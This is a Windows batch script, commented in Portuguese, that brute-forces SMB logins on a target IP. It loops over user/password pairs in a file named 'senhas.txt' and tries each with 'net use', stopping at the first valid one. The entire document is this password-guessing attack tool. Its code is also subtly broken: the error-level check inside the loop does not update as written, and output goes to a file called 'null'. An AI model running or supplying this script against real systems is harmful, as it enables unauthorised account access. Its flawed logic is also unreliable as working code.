::para desativar toda a exibição do terminal
@echo off

::defina aqui o IP alvo
set "ip_alvo=<ip_alvo>"

::faz a intera das linhas do arquivo senhas.txt, /f le o conteudo linha por linha
::tokens=1,2 divide cada linha em dois elementos (separados por espaço, tabulação ou vírgula).
for /f "tokens=1,2" %%i in (senhas.txt) do(
    echo Testando senha: %%i / %%j...
    net use \\%ip_alvo% %%j /user:%%i > null 2>&1
::%i usuario, %j senha
    ::verifica tudo
    if %errorlevel%==0 (
        echo [SUCESSO] credenciais validas: %%i / %%j
        exit /b 0
    ) else (
        echo [FALHA] credenciais invalidas: %%i / %%j
    )
)
::se nao der certo
echo todas as combinações falharam
exit /b 1